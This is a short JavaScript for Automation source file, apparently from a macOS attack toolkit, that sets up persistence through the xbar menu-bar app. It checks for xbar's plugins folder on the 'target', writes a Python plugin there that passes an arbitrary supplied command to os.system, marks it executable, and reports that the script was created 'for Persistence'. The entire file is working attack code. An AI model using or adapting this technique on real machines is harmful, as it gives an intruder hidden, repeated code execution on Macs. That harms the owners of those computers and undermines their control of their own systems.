//Concept from @bradleyjkemp

function xbarPlugin (command) {
ObjC.import('Foundation')
ObjC.import('stdlib')
var app = Application.currentApplication();
app.includeStandardAdditions = true;
var userHome = $.getenv('HOME')

var output = ""
try{
	function listDirectory(strPath) {
		var fm = $.NSFileManager.defaultManager;
        return ObjC.unwrap(
                fm.contentsOfDirectoryAtPathError($(strPath)
                    .stringByExpandingTildeInPath, null))
            .map(ObjC.unwrap);
    	}
        
	function writeTextToFile(text, file, overwriteExistingContent) {
        var fileString = file.toString()
        var openedFile = app.openForAccess(Path(fileString), { writePermission: true })
        if (overwriteExistingContent) {
            app.setEof(openedFile, { to: 0 })
        	}
        app.write(text, { to: openedFile, startingAt: app.getEof(openedFile) })
        app.closeAccess(openedFile)
		}
	function chmod(value, path) {
         let a = $({
                NSFilePosixPermissions: value
            })
          let p = $(path).stringByStandardizingPath
          let e = $()
          let r = $.NSFileManager.defaultManager
                .setAttributesOfItemAtPathError(a, p, e)
          return r
         }
	var xbarPluginpath = userHome + '/Library/Application\ Support/xbar/plugins/xbarUtil.py'
	var xbarPath = userHome + '/Library/Application\ Support/xbar/plugins'
	isDir=Ref()
	var xbarExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPath(xbarPath)
                if (xbarExistsCheck == false){
					output += "xbar not installed on target"
				} else {
var commandTemplate = `#!/usr/bin/python
import os
os.system(templateCommand)`

	var newCommand = commandTemplate.replace(/templateCommand/g,'"' + command + '"' )
	writeTextToFile(newCommand, xbarPluginpath, false)
	chmod(0o755, xbarPluginpath)
	output += "xbar Python Plugin Script created at " + xbarPluginpath + " for Persistence"
		}
								
}catch(error){
       output += error.toString()
		}
	return output
}
